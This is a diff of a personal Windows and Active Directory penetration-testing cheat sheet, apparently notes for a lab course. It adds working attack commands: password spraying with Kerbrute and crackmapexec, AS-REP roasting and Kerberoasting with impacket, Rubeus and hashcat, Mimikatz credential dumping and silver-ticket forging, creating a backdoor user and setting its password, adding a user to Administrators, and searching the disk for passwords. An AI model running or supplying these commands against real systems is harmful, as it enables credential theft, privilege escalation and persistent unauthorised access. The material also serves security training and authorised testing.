@@ -1,14 +1,5 @@
 # Windows Enumeration
 
-### Display Contents of a File
-
-```bash
-> Get-Content
-> type
-> cat
-```
-
-
 ### Initial Access
 
 There are several key pieces of information we should always obtain:
@@ -41,17 +32,19 @@ There are several key pieces of information we should always obtain:
 > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 > Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
 > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
-# However, the listed applications from Listing 15 may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
+# However, the listed applications from above may not be complete. For example, this could be due to an incomplete or flawed installation process. Therefore, we should always check 32-bit and 64-bit Program Files directories located in C:\. Additionally, we should review the contents of the Downloads directory of our user to find more potential programs.
 > dir "C:\Program Files"
+> dir "C:\Program Files (x86)"
 > dir "C:\Users\CurrentUser\Downloads"
 # While it is important to create a list of installed applications on the target system, it is equally important to identify which of them are currently running. 
 > Get-Process
 > Get-Process NonStandardProcess | Select-Object Path # Get the path of the process
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
-> Get-ChildItem -Path C:\ -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
+> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
+> findstr /spin “password” *.* # find all files with the word "password" in them
 > Get-History
 > (Get-PSReadlineOption).HistorySavePath
 # We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
@@ -127,9 +120,9 @@ powershell -ep bypass
 Note that SharpHound supports looping, running cyclical queries over time like a cron job, which will gather additional data such as environment changes, new log-ons.
 
 ```bash
-> . .\Sharphound.ps1 # or Import-Module .\Sharphound.ps1
+> . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
 > Get-Help Invoke-BloodHound
-> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\stephanie\\Desktop\ -OutputPrefix "corp audit" # May take a couple minutes
+> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\Public\\Desktop\ -OutputPrefix "web02" # May take a couple minutes
 ```
 
 ```bash
@@ -165,7 +158,7 @@ AD includes a wealth of permission types that can be used to configure an ACE. H
 Example abuse:
 
 ```bash
-net group "Management Department" stephanie /add /domain
+net group "Administrators" stephanie /add /domain
 ```
 
 #### enum4linux
@@ -218,16 +211,9 @@ Allows you to see the scheduled tasks on your local box (once you have a shell/s
 ```bash
 schtasks /query
 ...
+schtasks /query /fo LIST /v > schtasks.txt  
 schtasks /query /fo LIST /v /TN "FTP Backup"
 ```
-
-#### type 
-
-The Windows equivalent of cat.
-
-#### findstr
-
-The Windows equivalent of grep.
 
 #### Recursively Search Through Directories (May only be in CMD)
 
@@ -239,32 +225,103 @@ dir /s/b file.txt
 
 ```bash
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-#### Kerbrute Password Spraying
+#### Windows Password Spraying
 
 ```bash
-PS C:\Tools> type .\usernames.txt
-pete
-dave
-jen
-
-PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
-
-    __             __               __
+ __             __               __
    / /_____  _____/ /_  _______  __/ /____
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
 /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
 
-Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop
+PS C:\Tools> type .\usernames.txt
+pete
+dave
+jen
 
-2022/09/06 20:30:48 >  Using KDC(s):
-2022/09/06 20:30:48 >   dc1.corp.com:88
-2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
-2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
-2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
+# Validate Usernames
+PS C:\Tools> .\kerbrute_windows_amd64.exe userenum -d corp.com --dc=dc1.corp.com usernames.txt
+
+# Password Spraying
+PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+# If NTLM is enabled, you can use crackmapexec
+kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 ```
+
+#### AS-REP Roasting
+
+Must have "Do not require Kerberos preauthentication" enabled. Will provide AS-REP hash with session key and TGT, which you can try to crack with HashCat or crackstation.net.
+
+```bash
+kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+We can also perform AS-REP Roasting on Windows using Rubeus. Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except asreproast. Rubeus will automatically identify vulnerable user accounts. We also add the flag /nowrap to prevent new lines being added to the resulting AS-REP hashes.
+
+```bash
+PS C:\Tools> .\Rubeus.exe asreproast /nowrap
+```
+
+If no users have the "Do not require Kerberos preauthentication" enabled, but you have GenericWrite or GenericAll on another AD user account, you could reset their password (which would lock them out), or better yet change UAC permissions to enable "Do not require Kerberos preauthentication".
+
+#### Kerberoasting
+
+If we know the SPN  we want to target, we can request a service ticket for it from the domain controller. The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account.
+
+We'll provide hashes.kerberoast as an argument for /outfile to store the resulting TGS-REP hash in. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.
+
+```bash
+# Method from Windows
+PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+# Method from Linux
+kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+# If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
+kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. 
+
+#### Silver Tickets
+
+In general, you need to collect the following three pieces of informaiton to create a sliver ticket:
+	1. SPN password hash
+	2. Domain SID
+	3. Target SPN
+
+If you are a local Administrator on this machine where iis_service (the SPN) has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service). If you have the password, you can generate the NTML hash with codebeautify.org.
+
+```bash
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords # Looking for NTLM hash
+```
+
+To obtain the domain SID, the second piece of information we need, we can enter whoami /user to get the SID of the current user. Alternatively, we could also retrieve the SID of the SPN user account from the output of Mimikatz, since the domain user accounts exist in the same domain.
+
+```bash
+PS C:\Users\jeff> whoami /user # Looking for SID
+---------------
+User Name SID
+========= =============================================
+corp\jeff S-1-5-21-1987370270-658905905-1781884369 # ignore this part -1105
+
+mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+...
+mimikatz # exit
+```
+
+We should have the ticket ready to use in memory. We can confirm this with klist, and by using the service:
+
+```bash
+PS C:\Tools> iwr -UseDefaultCredentials http://web04
+```
+
 #### Create a Backdoor User
 
 You can use this user to RDP into a session and obtain a GUI. This assumes that you are already NT Authority.
@@ -287,13 +344,15 @@ xfreerdp /v:ms01 /u:backdoor /p:Password1 +x clipboard /cert:ignore
 
 We're using the SharpHound.ps1 from GitHub.
 ```bash
-> . .\\SharpHound.ps1
+> . .\SharpHound.ps1
 > Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName outfile.zip
 ```
 
 #### Check for GPP Vulnerability
 
 Say that you have a shell in MetaSploit, you can background that shell and run the "smb_enum_gpp" module to check if there is the GPP vulnerability in the environment.
+
+Search in \\web02.medtech.com\sysvol\medtech.com\policies\*.xml, C:\ProgramData\Microsoft\Group Policy\history, C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history for these files: Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, Drives.xml
 
 #### Recursively Downloading Files with SMB
 
@@ -311,7 +370,7 @@ Say that you have a shell in MetaSploit, you can background that shell and run t
 
 #### NTLM v NTLMv2
 
-NTLM hashes can be passed, NTLMv2 hased CANNOT be passed.
+NTLM hashes can be passed, NTLMv2 hashes CANNOT be passed.
 
 #### Windows' Grep (With Context)
 
@@ -359,6 +418,12 @@ scp C:\path\to\file.txt kali@<KALI_IP>:/path/to/save/
 
 ```bash
 [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
+```
+
+#### Change User's Password
+
+```bash
+Set-LocalUser -Name "backdoor" -Password (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
 ```
 
 #### Windows' Curl
@@ -656,3 +721,7 @@ There are other similar tools such as RottenPotato, SweetPotato, or JuicyPotato.
 ```bash
 kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ```
+
+#### Privileges Mapped to Exploits Page, such as SeImpersonate
+
+"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens"
